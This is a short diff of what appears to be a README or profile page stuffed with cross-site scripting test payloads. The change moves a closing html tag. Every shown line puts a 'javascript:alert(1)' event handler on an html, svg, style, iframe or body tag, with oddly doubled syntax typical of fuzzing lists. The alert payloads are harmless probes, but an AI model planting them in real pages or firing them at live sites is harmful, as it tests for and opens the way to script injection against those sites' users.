@@ -24,7 +24,6 @@ Here are some ideas to get you started:
 <html>
   <svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
 
-  </html>
 <style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
 <iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
 <body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
@@ -66,3 +65,6 @@ Here are some ideas to get you started:
 <svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
 <html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
 <body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
+
+
+  </html>
